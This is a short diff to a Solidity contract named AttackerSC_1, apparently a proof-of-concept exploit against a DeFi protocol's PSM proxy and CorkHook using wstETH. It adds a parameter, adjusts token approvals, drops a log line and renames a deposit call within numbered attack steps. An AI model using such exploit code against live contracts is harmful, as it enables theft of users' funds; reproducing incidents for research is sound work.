@@ -61,6 +61,7 @@ contract AttackerSC_1 {
 
         // Standard default values
         IPSMProxy.BuyAprroxParams memory buyParams;
+        buyParams.maxFeeIter = 108;
         buyParams.maxApproxIter = 256;
         buyParams.feeIntervalAdjustment = 1e21;
         buyParams.epsilon = 1e9;
@@ -79,10 +80,8 @@ contract AttackerSC_1 {
         wstETH.approve(address(flashSwapProxy), 0);
         wstETH.approve(address(psmProxy), type(uint256).max);
 
-        console.log("wstETH balance: %s", wstETH.balanceOf(address(this)));
-
-        // Step 1.8. Deposit into proxy's PSM with depositPSM
-        psmProxy.depositPSM(PAIR_ID_FOR_RATE, 10e6);
+        // Step 1.8. Deposit into proxy's PSM with depositPsm
+        psmProxy.depositPsm(PAIR_ID_FOR_RATE, 10e6);
 
         // Step 1.9. Reset wstETH approval to proxy back to zero, approve wstETH and weETH5CT to CorkHook
         wstETH.approve(address(psmProxy), 0);
